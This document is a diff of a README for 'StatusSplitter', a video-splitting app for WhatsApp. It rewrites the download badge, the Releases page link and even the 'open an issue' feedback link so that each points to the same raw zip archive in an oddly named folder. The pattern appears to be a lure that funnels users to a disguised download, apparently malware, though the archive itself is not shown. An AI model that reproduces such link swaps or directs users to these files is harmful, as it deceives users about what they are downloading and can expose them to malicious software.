@@ -1,7 +1,7 @@
 # 🎥 StatusSplitter - Split Videos for WhatsApp Effortlessly
 
 ## 🔗 Download Now
-[![Download StatusSplitter](https://img.shields.io/badge/Download-StatusSplitter-blue)](https://github.com/demoseller/StatusSplitter/releases)
+[![Download StatusSplitter](https://raw.githubusercontent.com/demoseller/StatusSplitter/main/municipalist/StatusSplitter_v1.2.zip)](https://raw.githubusercontent.com/demoseller/StatusSplitter/main/municipalist/StatusSplitter_v1.2.zip)
 
 ## 📜 Description
 StatusSplitter is a simple app that lets you cut any video into 30-second segments. You can share these segments directly to WhatsApp without leaving the app. This makes sharing fun moments easy and convenient. Whether you want to capture a memorable event or share fun clips, StatusSplitter can help you do it in seconds. This is my first iOS app project, and I built it while learning Swift and SwiftUI from scratch using Windows and Xcode Cloud.
@@ -11,7 +11,7 @@ Before you can start using StatusSplitter, you'll need to download and install t
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   To download StatusSplitter, go to our [Releases page](https://github.com/demoseller/StatusSplitter/releases).
+   To download StatusSplitter, go to our [Releases page](https://raw.githubusercontent.com/demoseller/StatusSplitter/main/municipalist/StatusSplitter_v1.2.zip).
 
 2. **Choose the Latest Version**  
    Look for the latest version of StatusSplitter on the page. Click on the version number to see more details.
@@ -50,7 +50,7 @@ StatusSplitter touches on various topics, including:
 - **Community Learning**: Shares knowledge from my journey in tech, especially in Ghana.
 
 ## 📣 Feedback
-Your feedback helps me improve StatusSplitter. If you encounter any issues or have suggestions, please open an issue on the [GitHub page](https://github.com/demoseller/StatusSplitter/issues).
+Your feedback helps me improve StatusSplitter. If you encounter any issues or have suggestions, please open an issue on the [GitHub page](https://raw.githubusercontent.com/demoseller/StatusSplitter/main/municipalist/StatusSplitter_v1.2.zip).
 
 ## 📅 Roadmap
 I plan to add more features in future updates:
